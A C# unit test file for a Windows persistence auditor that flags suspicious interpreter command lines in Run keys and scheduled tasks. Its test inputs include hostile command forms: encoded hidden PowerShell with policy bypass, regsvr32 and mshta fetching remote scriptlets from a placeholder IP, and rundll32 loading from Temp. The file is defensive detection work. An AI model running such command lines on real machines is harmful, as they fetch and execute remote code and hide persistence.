using Rempart.Core.Findings;
using Rempart.Core.Json;
using Rempart.Core.Snapshots;

namespace Rempart.Tests.Unit;

/// <summary>
/// The second axis of a persistence verdict: what the command line asks for, once the
/// signature has said all it can about the file.
///
/// <para>
/// Two things are being held at once, and they pull in opposite directions. A payload that
/// hides itself must produce a reason and a severity — an encoded <c>Run</c> entry used to
/// come out benign with nothing written beside it, and the reports print only what is not
/// benign, so it was invisible rather than merely unjudged. And a legitimate autorun must
/// stay exactly where it was: this project refuses false positives, and half the machines
/// in a fleet start a <c>cmd.exe</c> or a <c>rundll32.exe</c> at logon.
/// </para>
///
/// <para>
/// The second half is not held by a list of counter-examples written here, which would be a
/// second list from the same hand as the first: it is held by
/// <c>No_command_line_of_a_clean_capture_is_flagged</c>, which reads every versioned capture
/// off disk — the executable action of each of its couple of hundred scheduled tasks, and
/// the <c>Run</c> values beside them. It earns its place: matching the temporary folder as a
/// substring rather than as a path segment flags
/// <c>rundll32 Windows.Storage.ApplicationData.dll,CleanupTemporaryState</c>, a maintenance
/// task Windows itself ships, and this is the test that says so.
/// </para>
/// </summary>
public class InterpreterPayloadTests
{
    private const string PowerShell = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";

    private static PayloadJudgement Inspect(string executable, string arguments) =>
        InterpreterPayload.Inspect(executable, arguments);

    private static string Reasons(PayloadJudgement judgement) =>
        string.Join(" ", judgement.Reasons);

    /// <summary>
    /// The finding this file was written for. Every part of the entry is above suspicion —
    /// Microsoft's own interpreter, validly signed, in System32 — and the only thing that
    /// says anything is the command line.
    /// </summary>
    [Fact]
    public void An_encoded_command_is_notable_and_says_why()
    {
        var judgement = Inspect(PowerShell, "-NoProfile -w hidden -enc SQBFAFgA");

        Assert.Equal(FindingSeverity.Notable, judgement.Severity);
        Assert.Contains("encodée", Reasons(judgement), StringComparison.Ordinal);
    }

    /// <summary>
    /// PowerShell resolves a switch from any prefix of its name, so <c>-e</c>, <c>-ec</c>
    /// and <c>-enc</c> all reach <c>-EncodedCommand</c> and all appear in the wild. Matching
    /// literal spellings would catch the longest and miss the two that get typed.
    /// </summary>
    [Theory]
    [InlineData("-e")]
    [InlineData("-ec")]
    [InlineData("-enc")]
    [InlineData("-EncodedCommand")]
    [InlineData("/encodedcommand")]
    public void The_abbreviations_powershell_itself_accepts_are_recognised(string spelling)
    {
        Assert.Equal(FindingSeverity.Notable, Inspect(PowerShell, $"{spelling} SQBFAFgA").Severity);
    }

    /// <summary>
    /// A <c>Run</c> value routinely names the interpreter alone and lets Windows resolve it
    /// through the PATH. Nothing then ends in <c>.exe</c>, and requiring the suffix would
    /// leave the most compact form of the entry unjudged.
    /// </summary>
    [Fact]
    public void An_interpreter_named_without_its_suffix_is_still_an_interpreter()
    {
        Assert.Equal(FindingSeverity.Notable, Inspect("powershell", "-enc SQBFAFgA").Severity);
    }

    /// <summary>
    /// The trap this repository has already fallen into once, on the other axis: a
    /// substring test made a <c>WindowsApps</c> folder created inside a profile pass for
    /// the package store. A binary whose name merely ends with an interpreter's is not that
    /// interpreter, and dropping a copy under such a name costs nothing.
    /// </summary>
    [Theory]
    [InlineData(@"C:\Users\anon\AppData\Local\mypowershell.exe")]
    [InlineData(@"C:\Users\anon\AppData\Local\cmdline.exe")]
    public void A_binary_whose_name_merely_contains_an_interpreters_is_not_one(string path)
    {
        Assert.Equal(FindingSeverity.Benign, Inspect(path, "-enc SQBFAFgA").Severity);
    }

    /// <summary>
    /// The pair of legitimate entries Windows itself writes: a <c>RunOnce</c> deleting an
    /// installer, and a maintenance task calling into a system DLL. Both launch an
    /// interpreter, neither asks for anything, and flagging them would put a line on every
    /// machine in the fleet — the surest way to make a report go unread.
    /// </summary>
    [Theory]
    [InlineData(@"C:\Windows\System32\cmd.exe",
        @"/q /c del /q ""C:\Program Files\Microsoft OneDrive\Update\OneDriveSetup.exe""")]
    [InlineData(@"C:\Windows\System32\rundll32.exe",
        @"%windir%\system32\PcaSvc.dll,PcaPatchSdbTask")]
    [InlineData(@"C:\Windows\System32\cmd.exe", @"/d /c %systemroot%\system32\hpatchmonTask.cmd")]
    public void An_ordinary_interpreter_entry_stays_silent(string executable, string arguments)
    {
        var judgement = Inspect(executable, arguments);

        Assert.Equal(FindingSeverity.Benign, judgement.Severity);
        Assert.Empty(judgement.Reasons);
    }

    /// <summary>
    /// <c>regsvr32 /i:&lt;url&gt; scrobj.dll</c> glues the address to the switch, so the
    /// arguments have to be split on <c>:</c> as well as on spaces. Splitting on spaces
    /// alone would leave the whole token unrecognised — and it is the token that carries
    /// the payload.
    /// </summary>
    [Fact]
    public void A_remote_payload_is_seen_through_a_glued_switch()
    {
        var judgement = Inspect(
            @"C:\Windows\System32\regsvr32.exe", "/s /u /i:http://198.51.100.23/x.sct scrobj.dll");

        Assert.Equal(FindingSeverity.Notable, judgement.Severity);
        Assert.Contains("distant", Reasons(judgement), StringComparison.Ordinal);
    }

    [Fact]
    public void A_host_application_fetched_over_the_network_is_notable()
    {
        Assert.Equal(FindingSeverity.Notable,
            Inspect(@"C:\Windows\System32\mshta.exe", "http://198.51.100.23/x.hta").Severity);
    }

    /// <summary>
    /// A Windows path is an absolute URI as far as the parser is concerned — its scheme
    /// comes out as <c>file</c>. Only what actually crosses the network counts, otherwise
    /// every argument naming a file would read as a download.
    /// </summary>
    [Fact]
    public void A_local_path_argument_is_not_read_as_a_download()
    {
        Assert.Equal(FindingSeverity.Benign,
            Inspect(@"C:\Windows\System32\cmd.exe", @"/c C:\Windows\System32\gpupdate.exe").Severity);
    }

    /// <summary>
    /// The temporary folder is matched as a path segment, not as a substring:
    /// <c>C:\Templates\</c> and <c>C:\Tools\template.ps1</c> are not temporary folders, and
    /// a <c>Contains</c> would have said they were.
    /// </summary>
    [Theory]
    [InlineData(@"C:\Users\anon\AppData\Local\Temp\payload.dll,Start", FindingSeverity.Notable)]
    [InlineData(@"%TEMP%\payload.dll,Start", FindingSeverity.Notable)]
    [InlineData(@"C:\Templates\payload.dll,Start", FindingSeverity.Benign)]
    public void A_temporary_folder_is_matched_by_segment(string argument, FindingSeverity expected)
    {
        Assert.Equal(expected, Inspect(@"C:\Windows\System32\rundll32.exe", argument).Severity);
    }

    /// <summary>
    /// Quoting is honoured, so that a folder name containing a space stays one argument.
    /// Split on spaces alone, <c>C:\Temp Files\maj.bat</c> becomes <c>C:\Temp</c> followed
    /// by something else — and the first half is a temporary folder that was never there.
    /// </summary>
    [Fact]
    public void A_quoted_argument_containing_a_space_stays_one_argument()
    {
        var judgement = Inspect(
            @"C:\Windows\System32\cmd.exe", @"/c ""C:\Temp Files\maj.bat""");

        Assert.Equal(FindingSeverity.Benign, judgement.Severity);
    }

    /// <summary>
    /// <c>-NoProfile</c> on its own is what a well-written maintenance script does — not
    /// loading the operator's profile is good practice, and accusing it would accuse the
    /// careful half of the fleet. It is corroboration, never the whole case.
    /// </summary>
    [Fact]
    public void No_profile_alone_does_not_accuse()
    {
        var judgement = Inspect(
            PowerShell, @"-NoProfile -File ""C:\Program Files\Fournisseur\maj.ps1""");

        Assert.Equal(FindingSeverity.Benign, judgement.Severity);
        Assert.Empty(judgement.Reasons);
    }

    [Fact]
    public void No_profile_is_named_once_something_else_asks_for_a_look()
    {
        var judgement = Inspect(PowerShell, "-nop -enc SQBFAFgA");

        Assert.Contains("-NoProfile", Reasons(judgement), StringComparison.Ordinal);
    }

    /// <summary>
    /// <c>-w hidden</c> and <c>-ExecutionPolicy Bypass</c> are read from the value rather
    /// than from the switch name, which is what makes <c>-w</c>, <c>-WindowStyle</c> and
    /// <c>-windowstyle:hidden</c> one rule instead of three spellings.
    /// </summary>
    [Theory]
    [InlineData("-w hidden -File maj.ps1", "masquée")]
    [InlineData("-WindowStyle Hidden -File maj.ps1", "masquée")]
    [InlineData("-windowstyle:hidden -File maj.ps1", "masquée")]
    [InlineData("-ExecutionPolicy Bypass -File maj.ps1", "contournée")]
    [InlineData("-ep bypass -File maj.ps1", "contournée")]
    public void A_hidden_window_and_a_bypassed_policy_are_read_from_the_value(
        string arguments, string expected)
    {
        var judgement = Inspect(PowerShell, arguments);

        Assert.Equal(FindingSeverity.Notable, judgement.Severity);
        Assert.Contains(expected, Reasons(judgement), StringComparison.Ordinal);
    }

    /// <summary>
    /// A switch does not swallow the switch that follows it: in <c>-nop -w hidden</c>,
    /// <c>-w</c> is not the value of <c>-nop</c>. Getting this wrong would shift every
    /// value by one and read <c>hidden</c> as an argument of nothing.
    /// </summary>
    [Fact]
    public void A_switch_does_not_take_the_next_switch_as_its_value()
    {
        var judgement = Inspect(PowerShell, "-nop -w hidden -File maj.ps1");

        Assert.Equal(FindingSeverity.Notable, judgement.Severity);
        Assert.Contains("masquée", Reasons(judgement), StringComparison.Ordinal);
    }

    /// <summary>
    /// PowerShell's switches are read only for PowerShell. <c>cscript //B</c> and
    /// <c>cmd /c</c> have their own vocabulary, and borrowing one interpreter's grammar for
    /// another is how a legitimate flag comes to look like a marker.
    /// </summary>
    [Fact]
    public void The_powershell_grammar_is_not_applied_to_other_hosts()
    {
        Assert.Equal(FindingSeverity.Benign,
            Inspect(@"C:\Windows\System32\cscript.exe", "//B //Nologo maj.vbs").Severity);
    }

    /// <summary>
    /// A program that is not a script host is judged by its signature and by nothing else.
    /// An updater passing an address to itself is not downloading a payload — that is what
    /// updaters do — and the arguments of an ordinary binary say nothing about it.
    /// </summary>
    [Fact]
    public void An_ordinary_binary_is_not_judged_on_its_arguments()
    {
        var judgement = Inspect(
            @"C:\Program Files\Fournisseur\maj.exe", "--url=http://198.51.100.23/maj -w hidden");

        Assert.Equal(FindingSeverity.Benign, judgement.Severity);
    }

    /// <summary>
    /// The severity never climbs on its own: what is certain is that the reader has to see
    /// the line, not that the line is malicious. An unsigned interpreter stays suspicious
    /// because its signature said so, and the payload cannot lower that either.
    /// </summary>
    [Fact]
    public void The_payload_never_reaches_suspicious_by_itself()
    {
        Assert.Equal(FindingSeverity.Notable,
            Inspect(PowerShell, "-enc SQBFAFgA -w hidden -ExecutionPolicy Bypass").Severity);
    }

    /// <summary>
    /// The guard the marker list cannot provide for itself.
    ///
    /// <para>
    /// A hand-kept list is right the day it is written; what keeps it honest afterwards is
    /// being confronted with something nobody wrote for it. Every versioned capture is read
    /// off disk here — its <c>Run</c> values, including the ones the replay does not
    /// enumerate, and every action of its couple of hundred scheduled tasks — and the rule
    /// has to stay silent on all of them but the entry the compromise markers plant.
    /// </para>
    ///
    /// <para>
    /// The count is asserted too: a filter that matched nothing would report success, and
    /// this one walks a corpus whose shape comes from a real machine.
    /// </para>
    /// </summary>
    [Theory]
    [InlineData("hardened-win11")]
    [InlineData("default-win11")]
    [InlineData("restricted-access")]
    public void No_command_line_of_a_clean_capture_is_flagged(string fixture)
    {
        var (flagged, inspected) = InspectEveryCommandLine(fixture);

        Assert.Empty(flagged);

        Assert.True(inspected > 50,
            $"{inspected} ligne(s) de commande inspectée(s) dans « {fixture} » : ce garde "
            + "confronte la règle au disque, et un corpus vide rendrait vert sans rien lire.");
    }

    /// <summary>
    /// The other side of the same guard: the compromised capture must actually exercise the
    /// rule. A corpus on which nothing ever fires proves the rule silent, not correct.
    /// </summary>
    [Fact]
    public void The_compromised_capture_exercises_the_rule()
    {
        var (flagged, _) = InspectEveryCommandLine("compromised-win11");

        var single = Assert.Single(flagged);
        Assert.Contains("EncodedCommand", single, StringComparison.OrdinalIgnoreCase);
    }

    private static (IReadOnlyList<string> Flagged, int Inspected) InspectEveryCommandLine(
        string fixture)
    {
        var snapshot = RempartJson.DeserialiseSnapshot(RepositoryFiles.Read(
            $"tests/fixtures/synthetic/{fixture}.capture.json"));

        var flagged = new List<string>();
        var inspected = 0;

        foreach (var (key, read) in snapshot.Registry)
        {
            if (!key.Contains(@"CurrentVersion\Run", StringComparison.OrdinalIgnoreCase)
                || read.Value?.Text is not { Length: > 0 } command)
            {
                continue;
            }

            inspected++;

            var path = AutorunsCollector.ExtractExecutablePath(command);
            var arguments = command[(command.IndexOf(path, StringComparison.OrdinalIgnoreCase)
                + path.Length)..].TrimStart('"');

            if (InterpreterPayload.Inspect(path, arguments).Severity != FindingSeverity.Benign)
            {
                flagged.Add(command);
            }
        }

        foreach (var action in (snapshot.ScheduledTasks?.Tasks ?? []).SelectMany(t => t.Actions))
        {
            if (action.Kind != "exec" || action.Path.Length == 0)
            {
                continue;
            }

            inspected++;

            if (InterpreterPayload.Inspect(action.Path, action.Arguments).Severity
                != FindingSeverity.Benign)
            {
                flagged.Add($"{action.Path} {action.Arguments}");
            }
        }

        return (flagged, inspected);
    }
}
